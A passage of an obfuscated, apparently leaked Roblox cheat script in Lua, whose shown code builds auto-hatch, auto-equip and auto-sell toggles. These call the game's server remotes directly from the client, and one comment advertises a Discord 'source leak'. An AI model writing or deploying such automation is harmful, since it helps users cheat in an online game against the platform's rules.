					local flag232 = type(value157) == "table" and value157.Placement ~= nil
					local flag233

					if flag232 then
						flag233 = (tbl120[k] or 0) <= os.clock()
					else
						flag233 = flag232
					end

					if flag233 then
						local ok2, result2 = pcall(eggState.IsReadyToHatch, k)

						if ok2 and result2 == true then
							local assetCategory9 = tostring(value157.AssetCategory)

							if (Hatch[assetCategory9] or 0) > 0 then
								Hatch[assetCategory9] = Hatch[assetCategory9] - 1
								table.insert(tbl122, k)
							elseif flag231 and func173(value157) then
								table.insert(tbl123, k)
							end
						end
					end
				end

				for _, item55 in ipairs(tbl123) do
					table.insert(tbl122, item55)
				end

				return tbl122
			end

			local function func175()
				return str1.Toggle(value156, false) or str1.RiftOn("Hatch")
			end

			local function func176()
				local flag234 = n21
				local result32 = func174()
				local n22 = 0

				for _, item56 in ipairs(result32) do
					if not (n22 >= n19 or flag234 ~= n21 or not func175()) then
						local AskHatch, flag235 = func172("RF/EggWorld/AskHatch", item56)

						if AskHatch and flag235 ~= false then
							task.wait(0.35)
							func172("RF/EggWorld/AskFinishHatch", item56)
							n22 += 1
							tbl120[item56] = nil
						else
							tbl120[item56] = os.clock() + n20
						end

						task.wait(0.2)
						continue
					end

					break
				end

				return n22 > 0
			end

			tbl2.Add(function()
				if not func175() or flag227 then
					return false
				end
				flag227 = true

				task.spawn(function()
					pcall(func176)
					flag227 = false
				end)

				return false
			end)

			local function hatch()
				n21 += 1
				table.clear(tbl120)
				tbl2.Wake()
			end

			value156 = obj12:CreateToggle({ Name = "Auto Hatch", Default = false, Callback = hatch })

			obj12:CreateDropdown({
				Name = "Hatch Min Rarity",
				Note = "Hatch eggs of the chosen rarity and every rarity above it",
				Options = list3,
				Default = list3[1],
				SubOf = value156,
				Callback = function(value)
					tbl121.MinRarity = tbl8[value] or 0
					hatch()
				end,
			})

			local tbl124 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}

			local tbl125 = { Slider = nil, Value = 0, Unit = "M/s" }

			local function func177(flag236, flag237)
				if flag236 ~= nil then
					tbl125.Value = math.max(0, math.floor(tonumber(flag236) or tbl125.Value))
				end

				if flag237 ~= nil then
					tbl125.Unit = tostring(flag237)
				end

				tbl121.MinIncome = tbl125.Value * (tbl124[tbl125.Unit] or tbl124["M/s"]).Mult
				hatch()
			end

			tbl125.Slider = func5(obj12, {
				Name = "Min Hatch Value",
				Note = "Skip eggs worth less than this (0 = off)",
				SubOf = value156,
				Legacy = "Hatch Min Value",
				SectionName = "Auto Hatch & Equip",
				OnRaw = function(num78)
					func177(math.floor(num78 / 1000), "K/s")
				end,
			})

			local tbl126 = {}
			local tbl127 = {}
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local n22 = 0

			while (type(directory) ~= "table" or next(directory) == nil) and n22 < 2 do
				n22 += task.wait(0.1)

				if type(tbl1.Assets) ~= "table" then
					tbl1.Assets = func2(function()
						return ReplicatedStorage.Data.Assets
					end)
				end

				directory = tbl1.Assets and tbl1.Assets.Directory
			end

			local tbl128 = {}

			if type(directory) == "table" then
				for k, value158 in pairs(directory) do
					local rarity = type(value158) == "table" and value158.Rarity or nil
					local flag238 = type(rarity) == "table"

					if flag238 then
						flag238 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					local value159 = flag238 or nil

					if value159 then
						table.insert(tbl128, {
							Category = tostring(k),
							Name = tostring(value158.DisplayName or k),
							Rarity = value159,
							RarityName = tostring(rarity.DisplayName or rarity._id or value159),
						})
					end
				end
			end

			table.sort(tbl128, function(param118, param119)
				if param118.Rarity ~= param119.Rarity then
					return param118.Rarity > param119.Rarity
				end
				return param118.Name < param119.Name
			end)

			for _, item57 in ipairs(tbl128) do
				local formatted4 = string.format("%s [%s]", item57.Name, item57.RarityName)

				if tbl127[formatted4] then
					formatted4 = string.format("%s [%s] (%s)", item57.Name, item57.RarityName, item57.Category)
				end

				table.insert(tbl126, formatted4)
				tbl127[formatted4] = item57.Category
			end

			if #tbl126 > 0 then
				func6(obj12:CreateMultiDropdown({
					Name = "Hatch Specific Eggs",
					Note = "Only hatch these eggs (empty = all)",
					Options = tbl126,
					Default = {},
					SubOf = value156,
					Callback = function(value)
						local eggs = {}

						if type(value) == "table" then
							for k, value160 in pairs(value) do
								k = value160 == true and type(k) == "string" and k or type(value160) == "string" and value160 or nil

								if k and tbl127[k] then
									eggs[tbl127[k]] = true
								end
							end
						end

						tbl121.Eggs = eggs
						hatch()
					end,
				}))
			end

			str1.Rift.Restart.Hatch = hatch
		end

		do
			local n19 = 5
			local n20 = 30
			local value161 = nil
			local flag239 = false
			local n21 = 0
			local tbl129 = {}
			local n22 = 0
			local flag240 = true
			local value162 = nil
			local n23 = -math.huge

			local function func178(flag241)
				local value163 = func2(function()
					return ReplicatedStorage.Data.Bases
				end)

				if type(value163) == "table" and type(value163.GetAssetEquipCapacity) == "function" then
					local ok, result = pcall(value163.GetAssetEquipCapacity, flag241 and tonumber(flag241.BaseUpgradeLevel) or 0)
					if ok and tonumber(result) then
						return math.floor(tonumber(result))
					end
				end

				if value162 and os.clock() - n23 < n20 then
					return value162
				end
				local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")

				if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
					local ok, result = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)

					if ok and tonumber(result) then
						local n24 = math.floor(tonumber(result))
						local now = os.clock()
						value162 = n24
						n23 = now
						return value162
					end
				end

				return value162 or 0
			end

			local function func179(param120)
				local directory = tbl1.Assets and tbl1.Assets.Directory
				local flag242 = type(directory) == "table" and directory[tostring(param120.Category)] or nil
				local n24 = type(flag242) == "table" and tonumber(flag242.EarningRate) or 0
				local n25 = tonumber(param120.Scale) or 0
				if n24 <= 0 or n25 <= 0 then
					return 0
				end
				local n26 = n25 > 5 and (n25 / 5) ^ 1.2 * 19.637875755794113 or n25 ^ 1.85
				local mutations = tbl1.Mutations
				local flag243 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n27 = 1

				if flag243 then
					local ok, result = pcall(mutations.EarningsFor, type(param120.Mutations) == "table" and param120.Mutations or {})
					local flag244 = ok and type(result) == "number"
					local n28 = 1

					if flag244 then
						n27 = result
					else
						n27 = n28
					end
				end

				return n24 * n26 * n27
			end

			local function func180()
				local save3 = tbl1.Save
				local flag245 = type(save3) == "table" and type(save3.Get) == "function"
				local value164 = nil

				if flag245 then
					local ok, result = pcall(save3.Get)
					value164 = ok and type(result) == "table" and result or nil
				end

				if not value164 then
					return nil
				end
				local tbl130 = {}
				local tbl131 = {}
				local func181 = pairs
				local equippedAssets = value164.EquippedAssets or {}

				for _, equippedAsset in func181(equippedAssets) do
					if type(equippedAsset) == "string" then
						tbl130[equippedAsset] = true
						table.insert(tbl131, equippedAsset)
					end
				end

				local tbl132 = {}
				local func182 = pairs
				local inventory = value164.Inventory or {}

				for k, value165 in func182(inventory) do
					if type(value165) == "table" and value165.InFuse ~= true then
						table.insert(tbl132, { Uid = k, Income = func179(value165), Equipped = tbl130[k] == true })
					end
				end

				table.sort(tbl132, function(param121, param122)
					if param121.Income ~= param122.Income then
						return param121.Income > param122.Income
					end
					return tostring(param121.Uid) < tostring(param122.Uid)
				end)

				return tbl132, tbl130, #tbl131, value164
			end

			local function func183(list18, flag246)
				local tbl133 = {}
				local flag247 = false

				for i, item58 in ipairs(list18) do
					if not (flag246 < i) then
						if not item58.Equipped then
							table.insert(tbl133, item58.Uid)

							if not tbl129[item58.Uid] then
								flag247 = true
							end
						end

						continue
					end

					break
				end

				return tbl133, flag247
			end

			tbl2.Add(function()
				if not str1.Toggle(value161, false) then
					return false
				end
				local value166, value167, value168, value169 = func180()

				if value166 then
					local value170 = func178(value169)
					local value171, flag248 = func183(value166, value170)

					if (flag248 or flag240) and not flag239 and os.clock() >= n22 then
						for _, item59 in ipairs(value171) do
							tbl129[item59] = true
						end

						flag240 = false
						flag239 = true
						n22 = os.clock() + n19
						local flag249 = n21

						task.spawn(function()
							local rfHaulFetchWearBestStatus = networking:FindFirstChild("RF/Haul/FetchWearBestStatus")
							local isRemoteFunction = rfHaulFetchWearBestStatus and rfHaulFetchWearBestStatus:IsA("RemoteFunction")
							local flag250 = true

							if isRemoteFunction then
								local ok, result = pcall(rfHaulFetchWearBestStatus.InvokeServer, rfHaulFetchWearBestStatus)
								flag250 = ok and result ~= false and result ~= nil
							end

							local rfHaulWearBest = networking:FindFirstChild("RF/Haul/WearBest")

							if flag250 and flag249 == n21 and rfHaulWearBest and rfHaulWearBest:IsA("RemoteFunction") then
								pcall(rfHaulWearBest.InvokeServer, rfHaulWearBest)
							end

							flag239 = false
							tbl2.Wake()
						end)
					end
				end

				return false
			end)

			value161 = obj12:CreateToggle({
				Name = "Auto Equip Best",
				Note = "Equip Best when a better pet appears",
				Default = false,
				Callback = function()
					n21 += 1
					table.clear(tbl129)
					n22 = 0
					flag240 = true
					tbl2.Wake()
				end,
			})

			local save3 = tbl1.Save

			if type(save3) == "table" and type(save3.FieldSignal) == "function" then
				for _, item60 in ipairs({ "Inventory", "EquippedAssets" }) do
					local ok, result = pcall(save3.FieldSignal, item60)

					if ok and type(result) == "table" and type(result.Connect) == "function" then
						local ok2, result2 = pcall(result.Connect, result, function()
							flag240 = true
							tbl2.Wake()
						end)

						if ok2 and result2 then
							func4(function()
								pcall(function()
									result2:Disconnect()
								end)
							end)
						end
					end
				end
			end
		end

		local n19
		n19 = 3
		local n20
		n20 = 50
		local tbl134
		tbl134 = { "Rarity Only", "Value Only", "Rarity And Value", "Rarity Or Value" }
		local tbl135, tbl136, tbl137, tbl138, func184, value172

		do
			local value173 = func2(function()
				return ReplicatedStorage.Shared.Util.AssetItems
			end)

			tbl135 = {}
			tbl136 = {}
			tbl137 = {}
			tbl138 = {}
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local tbl139 = {}
			local tbl140 = {}

			if type(directory) == "table" then
				for k, value174 in pairs(directory) do
					local rarity = type(value174) == "table" and value174.Rarity or nil
					local flag251 = type(rarity) == "table"

					if flag251 then
						flag251 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					local value175 = flag251 or nil

					if value175 then
						local str14 = tostring(rarity.DisplayName or rarity._id or value175)
						tbl139[value175] = tbl139[value175] or str14

						table.insert(tbl140, {
							Category = tostring(k),
							Name = tostring(value174.DisplayName or k),
							Rarity = value175,
							RarityName = str14,
						})
					end
				end
			end

			local tbl141 = {}

			for k in pairs(tbl139) do
				table.insert(tbl141, k)
			end

			table.sort(tbl141)

			for _, item61 in ipairs(tbl141) do
				local formatted5 = string.format("%d - %s", item61, tbl139[item61])
				table.insert(tbl135, formatted5)
				tbl136[formatted5] = item61
			end

			table.sort(tbl140, function(param123, param124)
				if param123.Rarity ~= param124.Rarity then
					return param123.Rarity < param124.Rarity
				end
				return param123.Name < param124.Name
			end)

			for _, item62 in ipairs(tbl140) do
				local formatted6 = string.format("%s [%s]", item62.Name, item62.RarityName)

				if tbl138[formatted6] then
					formatted6 = string.format("%s [%s] (%s)", item62.Name, item62.RarityName, item62.Category)
				end

				table.insert(tbl137, formatted6)
				tbl138[formatted6] = item62.Category
			end

			func184 = function(param125)
				for _, item63 in ipairs(tbl135) do
					if tbl136[item63] == param125 then
						return item63
					end
				end

				return tbl135[1]
			end

			local value176 = nil
			value172 = nil
			local value177 = nil
			local value178 = nil
			local third2 = tbl134[3]
			local n21 = 3
			local n22 = 0
			local flag252 = true
			local tbl142 = {}
			local third3 = tbl134[3]
			local n23 = 3
			local n24 = 0
			local flag253 = true
			local tbl143 = {}
			local flag254 = false
			local n25 = 0

			local function func185(param126)
				local n26 = tonumber(param126) or 0
				local tbl144 = { "", "K", "M", "B", "T", "Qa", "Qi" }
				local n27 = 1

				while math.abs(n26) >= 1000 and n27 < #tbl144 do
					n26 /= 1000
					n27 += 1
				end

				return string.format(n27 == 1 and "$%.0f%s" or "$%.2f%s", n26, tbl144[n27])
			end

			local function func186(list19, tbl145)
				local tbl146 = {}

				if type(list19) == "table" then
					for k, value179 in pairs(list19) do
						k = value179 == true and type(k) == "string" and k or type(value179) == "string" and value179 or nil

						if k then
							tbl146[tbl145 and tbl145[k] or k] = true
						end
					end
				end

				return tbl146
			end

			local function func187(param127)
				local directory2 = tbl1.Assets and tbl1.Assets.Directory
				local flag255 = type(directory2) == "table" and directory2[tostring(param127)] or nil
				local rarity = type(flag255) == "table" and flag255.Rarity or nil
				local flag256 = type(rarity) == "table"

				if flag256 then
					flag256 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag256 or math.huge
			end

			local function func188(param128)
				local directory2 = tbl1.Assets and tbl1.Assets.Directory
				local flag257 = type(directory2) == "table" and directory2[tostring(param128.Category)] or nil
				local n26 = type(flag257) == "table" and tonumber(flag257.EarningRate) or 0
				local n27 = tonumber(param128.Scale) or 0
				if n26 <= 0 or n27 <= 0 then
					return 0
				end
				local n28 = n27 > 5 and (n27 / 5) ^ 1.2 * 19.637875755794113 or n27 ^ 1.85
				local mutations = tbl1.Mutations
				local flag258 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
				local n29 = 1

				if flag258 then
					local ok
					ok, n29 = pcall(mutations.EarningsFor, type(param128.Mutations) == "table" and param128.Mutations or {})
					local flag259 = ok and type(n29) == "number"
					local n30 = 1

					if not flag259 then
						n29 = n30
					end
				end

				return n26 * n28 * n29
			end

			local function func189(param129)
				return type(param129) == "table" and next(param129) ~= nil
			end

			local function func190()
				local save3 = tbl1.Save
				if type(save3) ~= "table" or type(save3.Get) ~= "function" then
					return nil
				end
				local ok, result = pcall(save3.Get)
				return ok and type(result) == "table" and result or nil
			end

			local function func191()
				local result33 = func190()
				local tbl147 = {}
				if not result33 then
					return tbl147, 0
				end
				local tbl148 = {}
				local func192 = pairs
				local equippedAssets = result33.EquippedAssets or {}

				for _, equippedAsset in func192(equippedAssets) do
					tbl148[equippedAsset] = true
				end

				local func193 = pairs
				local inventory = result33.Inventory or {}
				local n26 = 0

				for k, value180 in func193(inventory) do
					local flag260 = type(value180) == "table" and value180.InFuse ~= true and value180.IsFavorite ~= true and not tbl148[k] and not tbl142[tostring(value180.Category)]

					if flag260 then
						flag260 = not (flag252 and func189(value180.Mutations))
					end

					if flag260 then
						local num79 = func188(value180)
						local category3 = func187(value180.Category) <= n21
						local flag261 = n22 > 0 and num79 < n22

						if third2 ~= tbl134[2] then
							if third2 == tbl134[3] then
								flag261 = category3 and flag261
							elseif third2 ~= tbl134[4] then
								flag261 = category3
							else
								flag261 = category3 or flag261
							end
						end

						if flag261 then
							table.insert(tbl147, k)
							local flag262 = type(value173) == "table" and type(value173.SalePrice) == "function"
							local flag263 = false
							local result = nil

							if flag262 then
								flag263, result = pcall(value173.SalePrice, value180)
							end

							n26 += flag263 and tonumber(result) or num79 * 100
						end
					end
				end

				return tbl147, n26
			end

			local function func194()
				local tbl149 = {}
				local eggState = tbl1.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return tbl149, 0
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return tbl149, 0
				end
				local character = localPlayer.Character
				character = character and character:FindFirstChildWhichIsA("Tool")
				character = character and character:GetAttribute("UID") or nil
				local eggRecords = tbl1.EggRecords
				local value181, value182, value183 = pairs(result)
				local n26 = 0

				for k, value184 in value181, value182, value183 do
					local flag264 = type(value184) == "table" and value184.Placement == nil and k ~= character and not str1.Lab.Reserved[k]

					if flag264 then
						flag264 = not (value184.EggSkin ~= nil and str1.SellLab and str1.SellLab.Skins[tostring(value184.EggSkin)])
					end

					flag264 = flag264 and not tbl143[tostring(value184.AssetCategory)]
					local flag265

					if flag264 then
						flag265 = not (flag253 and func189(value184.Mutations))
					else
						flag265 = flag264
					end

					if flag265 then
						local flag266 = func188({ Category = value184.AssetCategory, Scale = value184.AssetScale, Mutations = value184.Mutations })
						local assetCategory10 = func187(value184.AssetCategory) <= n23
						local flag267 = n24 > 0 and flag266 < n24
						local value185

						if third3 == tbl134[2] then
							value185 = flag267
						elseif third3 == tbl134[3] then
							value185 = assetCategory10 and flag267
						elseif third3 ~= tbl134[4] then
							value185 = assetCategory10
						else
							value185 = assetCategory10 or flag267
						end

						if value185 then
							table.insert(tbl149, k)

							if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
								local ok2, result2 = pcall(eggRecords.SellPrice, value184)
								n26 += ok2 and tonumber(result2) or 0
							end
						end
					end
				end

				return tbl149, n26
			end

			local function func195(list20, list21)
				local rePetSatchelSellSelection = networking:FindFirstChild("RE/PetSatchel/SellSelection")
				if not rePetSatchelSellSelection or not rePetSatchelSellSelection:IsA("RemoteEvent") then
					return false
				end
				local n26 = math.max(#list20, #list21)
				local n27 = 1

				while n27 <= n26 do
					local tbl150 = {}
					local tbl151 = {}

					for i = n27, n27 + n20 - 1 do
						if list20[i] then
							table.insert(tbl150, list20[i])
						end

						if list21[i] then
							table.insert(tbl151, list21[i])
						end
					end

					pcall(rePetSatchelSellSelection.FireServer, rePetSatchelSellSelection, { Eggs = tbl151, Assets = tbl150 })
					n27 += n20

					if n27 <= n26 then
						task.wait(0.3)
					end
				end

				return true
			end

			local function func196(list22, list23)
				if flag254 or #list22 == 0 and #list23 == 0 then
					return
				end
				flag254 = true
				n25 = os.clock() + n19

				task.spawn(function()
					pcall(func195, list22, list23)
					flag254 = false
					tbl2.Wake()
				end)
			end

			tbl2.Add(function()
				local flag268 = str1.Toggle(value176, false)
				local flag269 = str1.Toggle(value172, false)
				local list24, value186 = func191()
				local list25, value187 = func194()

				if value177 and type(value177.Set) == "function" then
					pcall(value177.Set, value177, string.format("Pet matches  -  %d pets for %s", #list24, func185(value186)))
				end

				if value178 and type(value178.Set) == "function" then
					pcall(value178.Set, value178, string.format("Egg matches  -  %d eggs for %s", #list25, func185(value187)))
				end

				local value188 = flag254
				local flag270

				if flag254 then
					flag270 = value188
				else
					flag270 = os.clock() < n25
				end

				if not flag270 then
					flag270 = not (flag268 or flag269)
				end

				if flag270 then
					return false
				end
				func196(flag268 and list24 or {}, flag269 and list25 or {})
				return false
			end)

			value177 = obj13:CreateText({ Name = "Pet Sell Preview", Text = "Pet matches  -  0 pets" })

			value176 = obj13:CreateToggle({
				Name = "Auto Sell Pet",
				Default = false,
				Callback = function()
					tbl2.Wake()
				end,
			})

			obj13:CreateButton({
				Name = "Sell Pets Now",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = value176,
				Callback = function()
					func196(func191(), {})
				end,
			})

			obj13:CreateDropdown({
				Name = "Sell Pet Rule",
				Note = "Which checks must pass to sell",
				Options = tbl134,
				Default = tbl134[3],
				SubOf = value176,
				Callback = function(value)
					if table.find(tbl134, value) then
						third2 = value
						tbl2.Wake()
					end
				end,
			})

			obj13:CreateDropdown({
				Name = "Pet Max Rarity",
				Note = "Sell pets at or below this rarity",
				Options = tbl135,
				Default = func184(3),
				SubOf = value176,
				Callback = function(value)
					n21 = tbl136[value] or n21
					tbl2.Wake()
				end,
			})

			local tbl152 = {
				["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
				["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
				["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
			}
			-- Ｓｏｕｒｃｅ Ｌｅａｋ // discord.gg/x7YbZeezpm

			local function func197(flag271, param130, param131, callback8)
				local n26 = 0
				local str15 = "M/s"

				local function func198(flag272, flag273)
					if flag272 ~= nil then
						n26 = math.max(0, math.floor(tonumber(flag272) or n26))
					end

					if flag273 ~= nil then
						str15 = tostring(flag273)
					end

					callback8(n26 * (tbl152[str15] or tbl152["M/s"]).Mult)
					tbl2.Wake()
				end

				return (func5(obj13, {
					Name = flag271 == "Pet Value Threshold" and "Pet Sell Value" or flag271 == "Egg Value Threshold" and "Egg Sell Value" or flag271,
					Note = param130,
					SubOf = param131,
					Legacy = flag271,
					SectionName = "Auto Sell",
					OnRaw = function(num80)
						func198(math.floor(num80 / 1000), "K/s")
					end,
				}))
			end

			func197("Pet Value Threshold", "Sell pets worth less than this (0 = off)", value176, function(param132)
				n22 = param132
			end)

			local value189 = nil

			value189 = obj13:CreateToggle({
				Name = "Keep Mutated Pets",
				Note = "Never sell mutated pets",
				Default = true,
				SubOf = value176,
				Callback = function()
					flag252 = str1.Toggle(value189, true)
					tbl2.Wake()
				end,
			})

			func6(obj13:CreateMultiDropdown({
				Name = "Blacklist Sell Pets",
				Note = "These pets are never sold",
				Options = tbl137,
				Default = {},
				SubOf = value176,
				Callback = function(value)
					tbl142 = func186(value, tbl138)
					tbl2.Wake()
				end,
			}))

			value178 = obj13:CreateText({ Name = "Egg Sell Preview", Text = "Egg matches  -  0 eggs" })

			value172 = obj13:CreateToggle({
				Name = "Auto Sell Egg",
				Note = "Sell bag eggs matching the rules below",
				Default = false,
				Callback = function()
					tbl2.Wake()
				end,
			})

			obj13:CreateButton({
				Name = "Sell Eggs Now",
				Note = "Sell matching eggs once",
				ButtonText = "Sell",
				ConfirmText = "Sold!",
				SubOf = value172,
				Callback = function()
					local result34 = func194()
					func196({}, result34)
				end,
			})

			obj13:CreateDropdown({
				Name = "Sell Egg Rule",
				Note = "Which checks must pass to sell",
				Options = tbl134,
				Default = tbl134[3],
				SubOf = value172,
				Callback = function(value)
					if table.find(tbl134, value) then
						third3 = value
						tbl2.Wake()
					end
				end,
			})

			obj13:CreateDropdown({
				Name = "Egg Max Rarity",
				Note = "Sell eggs at or below this rarity",
				Options = tbl135,
				Default = func184(3),
				SubOf = value172,
				Callback = function(value)
					n23 = tbl136[value] or n23
					tbl2.Wake()
				end,
			})

			func197("Egg Value Threshold", "Sell eggs worth less than this (0 = off)", value172, function(param133)
				n24 = param133
			end)

			local value190 = nil

			value190 = obj13:CreateToggle({
				Name = "Keep Mutated Eggs",
				Note = "Never sell mutated eggs",
				Default = true,
				SubOf = value172,
				Callback = function()
					flag253 = str1.Toggle(value190, true)
					tbl2.Wake()
				end,
			})

			local function func199()
				local sellLabSection = tbl1.SellLabSection

				local sellLab = {
					Skins = {},
					Rule = tbl134[3],
					MaxRarity = 0,
					IncomeLimit = 0,
					KeepMutated = true,
					KeepPets = {},
					Handle = nil,
					Preview = nil,
				}

				str1.SellLab = sellLab
				local tbl153 = {}
				local tbl154 = {}
				local tbl155 = {}
				local tbl156 = {}

				local ok, result = pcall(function()
					return require(ReplicatedStorage.Data.ScrambleTradeIn)
				end)

				local banners = ok and type(result) == "table" and type(result.Banners) == "table" and result.Banners or {}
				local tbl157 = {}

				for _, banner in ipairs(banners) do
					if type(banner) == "table" and banner.EggSkin ~= nil then
						local eggSkin = tostring(banner.EggSkin)
						sellLab.Skins[eggSkin] = true
						local str16 = tostring(banner.DisplayName or banner.Id or eggSkin)

						if tbl154[str16] then
							str16 ..= " (" .. eggSkin .. ")"
						end

						tbl154[str16] = eggSkin
						table.insert(tbl153, str16)
						local func200 = ipairs
						local pets = type(banner.Pets) == "table" and banner.Pets or {}

						for _, pet in func200(pets) do
							local str17 = type(pet) == "table" and pet.AssetId ~= nil and tostring(pet.AssetId) or nil

							if str17 and not tbl157[str17] then
								tbl157[str17] = true
								local directory2 = tbl1.Assets and tbl1.Assets.Directory
								local flag274 = type(directory2) == "table" and directory2[str17] or nil
								local flag275 = type(flag274) == "table"

								if flag275 then
									flag275 = tostring(flag274.DisplayName or str17)
								end

								flag275 = flag275 or str17

								if tbl156[flag275] then
									flag275 ..= " (" .. str17 .. ")"
								end

								tbl156[flag275] = str17
								table.insert(tbl155, flag275)
							end
						end
					end
				end

				table.sort(tbl155)

				local function eggs()
					local tbl158 = {}
					local eggState = tbl1.EggState
					if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
						return tbl158, 0
					end
					local ok2, result2 = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
					if not ok2 or type(result2) ~= "table" then
						return tbl158, 0
					end
					local character = localPlayer.Character
					local tool = character and character:FindFirstChildWhichIsA("Tool")
					tool = tool and tool:GetAttribute("UID") or nil
					local eggRecords = tbl1.EggRecords
					local value191, value192, value193 = pairs(result2)
					local n26 = 0

					for k, value194 in value191, value192, value193 do
						local flag276 = type(value194) == "table" and value194.EggSkin ~= nil and tostring(value194.EggSkin) or nil
						flag276 = flag276 and sellLab.Skins[flag276] and value194.Placement == nil and k ~= tool and not str1.Lab.Reserved[k] and not sellLab.KeepPets[tostring(value194.AssetCategory)]

						if flag276 then
							flag276 = not (sellLab.KeepMutated and func189(value194.Mutations))
						end

						if flag276 then
							local flag277 = func188({ Category = value194.AssetCategory, Scale = value194.AssetScale, Mutations = value194.Mutations })
							local maxRarity = sellLab.MaxRarity
							local assetCategory11 = func187(value194.AssetCategory) <= maxRarity
							local flag278 = sellLab.IncomeLimit > 0 and flag277 < sellLab.IncomeLimit

							if sellLab.Rule ~= tbl134[2] then
								if sellLab.Rule == tbl134[3] then
									flag278 = assetCategory11 and flag278
								elseif sellLab.Rule ~= tbl134[4] then
									flag278 = assetCategory11
								else
									flag278 = assetCategory11 or flag278
								end
							end

							if flag278 then
								table.insert(tbl158, k)

								if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
									local ok3, result3 = pcall(eggRecords.SellPrice, value194)
									n26 += ok3 and tonumber(result3) or 0
								end
							end
						end
					end

					return tbl158, n26
				end

				sellLab.Eggs = eggs
				sellLab.Preview = sellLabSection:CreateText({ Name = "Lab Egg Sell Preview", Text = "Lab egg matches  -  0 eggs" })

				sellLab.Handle = sellLabSection:CreateToggle({
					Name = "Auto Sell Lab Egg",
					Note = "Sell eggs traded from Dr Scramble that match the filters below",
					Default = false,
					Callback = function()
						tbl2.Wake()
					end,
				})

				sellLabSection:CreateButton({
					Name = "Sell Lab Eggs Now",
					Note = "Sell matching Lab eggs once",
					ButtonText = "Sell",
					ConfirmText = "Sold!",
					SubOf = sellLab.Handle,
					Callback = function()
						local result35 = eggs()
						func196({}, result35)
					end,
				})

				sellLabSection:CreateDropdown({
					Name = "Sell Lab Egg Rule",
					Note = "Which checks must pass to sell",
					Options = tbl134,
					Default = tbl134[3],
					SubOf = sellLab.Handle,
					Callback = function(rule)
						if table.find(tbl134, rule) then
							sellLab.Rule = rule
							tbl2.Wake()
						end
					end,
				})

				local tbl159 = { "Off" }

				for _, item64 in ipairs(tbl135) do
					table.insert(tbl159, item64)
				end

				sellLabSection:CreateDropdown({
					Name = "Lab Egg Max Rarity",
					Note = "Sell Lab eggs at or below this rarity (Off = none by rarity)",
					Options = tbl159,
					Default = "Off",
					SubOf = sellLab.Handle,
					Callback = function(value)
						sellLab.MaxRarity = tbl136[value] or 0
						tbl2.Wake()
					end,
				})

				func5(sellLabSection, {
					Name = "Lab Egg Sell Value",
					Note = "Sell Lab eggs worth less than this (0 = off)",
					SubOf = sellLab.Handle,
					Legacy = "Lab Egg Value Threshold",
					SectionName = "Auto Sell Lab Egg",
					OnRaw = function(param134)
						sellLab.IncomeLimit = math.max(0, tonumber(param134) or 0)
						tbl2.Wake()
					end,
				})

				local value195 = nil

				value195 = sellLabSection:CreateToggle({
					Name = "Keep Mutated Lab Eggs",
					Note = "Never sell mutated Lab eggs",
					Default = true,
					SubOf = sellLab.Handle,
					Callback = function()
						sellLab.KeepMutated = str1.Toggle(value195, true)
						tbl2.Wake()
					end,
				})

				if #tbl155 > 0 then
					func6(sellLabSection:CreateMultiDropdown({
						Name = "Keep Lab Pets",
						Note = "Lab eggs of these pets are never sold",
						Options = tbl155,
						Default = {},
						SubOf = sellLab.Handle,
						Callback = function(value)
							sellLab.KeepPets = func186(value, tbl156)
							tbl2.Wake()
						end,
					}))
				end

				tbl2.Add(function()
					local list26, value196 = eggs()

					if sellLab.Preview and type(sellLab.Preview.Set) == "function" then
						pcall(sellLab.Preview.Set, sellLab.Preview, string.format("Lab egg matches  -  %d eggs for %s", #list26, func185(value196)))
					end

					if flag254 or os.clock() < n25 or not str1.Toggle(sellLab.Handle, false) then
						return false
					end
					func196({}, list26)
					return false
				end)
			end

			func199()

			func6(obj13:CreateMultiDropdown({
				Name = "Blacklist Sell Eggs",
				Note = "These eggs are never sold",
				Options = tbl137,
				Default = {},
				SubOf = value172,
				Callback = function(value)
					tbl143 = func186(value, tbl138)
					tbl2.Wake()
				end,
			}))
		end

		local save3 = tbl1.Save

		if type(save3) == "table" and type(save3.FieldSignal) == "function" then
			for _, item65 in ipairs({ "Inventory", "EggInventory", "EquippedAssets" }) do
				local ok, result = pcall(save3.FieldSignal, item65)

				if ok and type(result) == "table" and type(result.Connect) == "function" then
					local ok2, result2 = pcall(result.Connect, result, function()
						tbl2.Wake()
					end)

					if ok2 and result2 then
						func4(function()
							pcall(function()
								result2:Disconnect()
							end)
						end)
					end
				end
			end
		end

		local n21
		n21 = 2
		local n22
		n22 = 3
		local n23
		n23 = 20
		local tbl160
		tbl160 = { "Lowest Rarity First", "Highest Rarity First", "Most Copies First", "Lowest Value First" }
		local tbl161
		tbl161 = { "Lowest To Highest", "Highest To Lowest" }
		local list27
		list27 = {}
		local tbl162
		tbl162 = {}
		local tbl163
		tbl163 = {}
		local tbl164
		tbl164 = {}

		do
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local tbl165 = {}
			local tbl166 = {}

			if type(directory) == "table" then
				for k, value197 in pairs(directory) do
					local rarity = type(value197) == "table" and value197.Rarity or nil
					local flag279 = type(rarity) == "table"

					if flag279 then
						flag279 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag279 = flag279 or nil

